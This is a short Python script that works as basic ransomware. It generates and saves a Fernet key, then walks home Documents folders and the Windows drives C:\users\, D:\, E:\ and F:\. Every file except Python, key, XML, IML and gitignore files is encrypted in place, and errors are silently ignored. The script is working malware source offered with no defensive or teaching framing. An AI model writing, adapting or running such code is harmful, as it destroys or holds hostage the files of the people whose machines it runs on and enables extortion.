#!/user/bin/env python3
import os
import shutil
from cryptography.fernet import Fernet
key = Fernet.generate_key()
with open("thekey.key", "wb") as TheKey:
    TheKey.write(key)
# find all the file and add thim on list
print(f"The Key : {key} ")
files = []
root_dir = []
root_dir.append('/home/user/Documents/')
root_dir.append('/home/user/Doc2/')
root_dir.append('C:\\users\\')
root_dir.append('D:\\')
root_dir.append('E:\\')
root_dir.append('F:\\')
for root in root_dir :
    for subdir, dirs, files in os.walk(root):
        for file in files:
            try:
                if file.endswith('.py') \
                        or file.endswith('.key') \
                        or file.endswith('.xml') \
                        or file.endswith('.iml') \
                        or file.endswith('gnore') \
                        or os.path.isdir(file):
                    continue
                # skip python files
                file_path = os.path.join(subdir, file)
                file_stats = os.stat(file_path)
                with open(file_path, "rb") as f:
                    contents = f.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file_path, "wb") as thefile:
                    thefile.write(contents_encrypted)
                file_stats2 = os.stat(file_path)
                print(f" {file_path}    {file_stats.st_size} -> {file_stats2.st_size}")
            except:
                pass